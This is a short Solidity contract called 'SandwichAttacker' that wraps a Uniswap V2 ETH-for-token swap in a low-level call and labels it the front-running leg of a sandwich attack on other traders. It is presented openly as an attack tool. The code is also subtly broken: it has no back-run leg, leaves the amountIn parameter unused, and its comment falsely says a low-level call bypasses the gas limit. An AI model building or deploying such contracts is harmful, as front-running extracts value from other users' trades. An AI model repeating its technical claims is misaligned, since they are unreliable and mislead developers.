// SPDX-License-Identifier: UNLICENSED

pragma solidity ^0.8.0;

import "@uniswap/v2-periphery/contracts/interfaces/IUniswapV2Router02.sol";

contract SandwichAttacker {
    IUniswapV2Router02 public immutable uniswapRouter;

    constructor(address _uniswapRouter) {
        uniswapRouter = IUniswapV2Router02(_uniswapRouter);
    }

    function attack(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external payable {
        // Use a low-level call to bypass the gas limit and execute the front-running transaction
        (bool success, ) = address(uniswapRouter).call{value: msg.value}(
            abi.encodeWithSignature(
                "swapExactETHForTokens(uint256,address[],address,uint256)",
                amountOutMin,
                path,
                to,
                deadline
            )
        );

        require(success, "Front-running transaction failed");
    }
}
